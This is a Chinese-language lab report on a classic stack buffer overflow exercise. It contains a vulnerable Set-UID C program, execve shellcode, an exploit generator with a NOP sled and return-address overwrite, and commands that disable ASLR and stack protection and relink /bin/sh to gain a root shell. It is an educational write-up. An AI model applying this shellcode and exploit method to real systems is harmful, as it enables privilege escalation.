# 缓冲区溢出漏洞实验的实验报告

## 实验目的

利用缓冲区溢出漏洞，通过 shellcode 获得 linux 下的 root 权限。

## 实验原理

我们的攻击目标是以下一段含有缓冲区溢出漏洞的代码：

```c
void function(const char *str)
{
    char buffer[12];
    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);
}
```

程序中 ``strcpy`` 函数的调用将 ``str`` 指向的内容复制到 ``buffer`` 中，而 `buffer` 的大小只有最多 $12$ 个字节，当 ``str`` 多于 $12$ 个字节时，栈中大于 ``buffer`` 地址的部分数据就会被改写。

通过构造 ``str`` 字符串包含的内容，使其包含一段二进制代码，并且将栈中的返回地址覆盖为这段代码在内存中的地址，即可使被攻击的程序执行该代码。

## 实验步骤

### 1 实验准备

1. 本次实验为了方便观察汇编语句，我们需要在 32 位环境下操作，因此实验之前需要做一些准备。

   输入命令安装一些用于编译 32 位 C 程序的软件包：

   ```bash
   $ sudo apt-get update
   
   $ sudo apt-get install -y lib32z1 libc6-dev-i386
   
   $ sudo apt-get install -y lib32readline-gplv2-dev
   ```

2. 现代操作系统具有一些对缓冲区溢出的防御措施，如将栈地址随机化 —— 每次运行同一个程序时，栈的地址不同，也就无法得知构造的二进制代码被写入到内存中的位置。为了进行实验，我们可以临时关闭（直到重新启动）这一特性：

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

3. 此外，为了进一步防范缓冲区溢出攻击及其它利用 shell 程序的攻击，许多shell程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个 Set-UID 程序调用一个 shell，也不能在这个 shell 中保持 root 权限，这个防护措施在 `/bin/bash` 中实现。
linux 系统中，`/bin/sh` 实际是指向 `/bin/bash` 或 `/bin/dash` 的一个符号链接。为/了重现这一防护措施被实现之前的情形，我们使用另一个 shell 程序（zsh）代替 `/bin/bash`。下面的指令描述了如何设置 zsh 程序：

```bash
$ sudo su

$ cd /bin

$ rm sh

$ ln -s zsh sh

$ exit
```

4. 输入命令“`linux32`”进入32位linux环境，输入“`/bin/bash`”使用bash 。

### 2 shellcode

一般情况下，缓冲区溢出会造成程序崩溃，在程序中，溢出的数据覆盖了返回地址。而如果覆盖返回地址的数据是另一个地址，那么程序就会跳转到该地址，如果该地址存放的是一段精心设计的代码用于实现其他功能，这段代码就是 shellcode。

编写以下用以打开 shell 的代码：

```c
#include <stdio.h>
int main()
{
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

本次实验的 shellcode，就是刚才代码的汇编版本：

```shell
\x31\xc0\x50\x68"//sh"\x68"/bin"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

### 3 漏洞程序

漏洞程序 ``stack.c`` 内容如下：

```c
/* stack.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void function(const char *str)
{
    char buffer[12];
    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    function(str);

    printf("Returned Properly\n");
    return 1;
}
```

该程序从文件 ``badfile`` 中读入数据并存入 ``buffer`` 中。

编译该程序，并设置 SET-UID。命令如下：

```bash
$ sudo su

$ gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c

$ chmod u+s stack

$ exit
```

> GCC编译器有一种栈保护机制来阻止缓冲区溢出，所以我们在编译代码时需要用 `–fno-stack-protector` 关闭这种机制。 而 `-z execstack` 用于允许执行栈。
>
> `-g` 参数是为了使编译后得到的可执行文档能用 `gdb` 调试。
>
> chmod u+s 可以给程序的所有者以suid权限，可以像root用户一样操作。

### 4 攻击程序

```c
/* exploit.c */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
    "\x31\xc0" //xorl %eax,%eax
    "\x50"     //pushl %eax
    "\x68""//sh" //pushl $0x68732f2f
    "\x68""/bin"     //pushl $0x6e69622f
    "\x89\xe3" //movl %esp,%ebx
    "\x50"     //pushl %eax
    "\x53"     //pushl %ebx
    "\x89\xe1" //movl %esp,%ecx
    "\x99"     //cdq
    "\xb0\x0b" //movb $0x0b,%al
    "\xcd\x80" //int $0x80
    ;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    strcpy(buffer,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x??\x??\x??\x??");   //在buffer特定偏移处起始的四个字节覆盖sellcode地址  
    strcpy(buffer + 100, shellcode);   //将shellcode拷贝至buffer，偏移量设为了 100

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

注意上面的代码，`\x??\x??\x??\x??` 处需要添上 `shellcode` 保存在内存中的地址，因为发生溢出后这个位置刚好可以覆盖返回地址。而 `strcpy(buffer+100,shellcode);` 这一句又告诉我们，`shellcode` 保存在 `buffer + 100` 的位置。

如何获得该地址便是进行攻击的关键所在，下面将详细介绍如何获得我们需要添加的地址。

我们的方法是通过 gdb 调试来获得该地址。输入命令：

```bash
# gdb 调试
$ gdb stack

$ disass main
```

结果如图：

![pic1](/home/kyleyoung/Pictures/pic1.png)

通过设置断点并输出 ``$esp$`` 的值，进一步计算就可以获得我们需要的地址：

![pic2](/home/kyleyoung/Pictures/pic2.png)

计算可得 shellcode 的地址 `shellcode` 的地址为 `0xffffd2d0(十六进制) + 0x64(100的十六进制) = 0xffffd334(十六进制)`(这一步的具体数值需根据实际结果计算)。

现在修改exploit.c文件！将 \x??\x??\x??\x?? 修改为 \x34\xd3\xff\xff，然后编译 `exploit.c` 程序：

```bash
$ gcc -m32 -o exploit exploit.c
```

![pic3](/home/kyleyoung/Pictures/pic3.png)

可见，我们成功地利用缓冲区溢出漏洞打开了 shell 并获得了 root 权限。

## 遗留问题

在本机上如何获得 shellcode 的地址并获得 root 权限。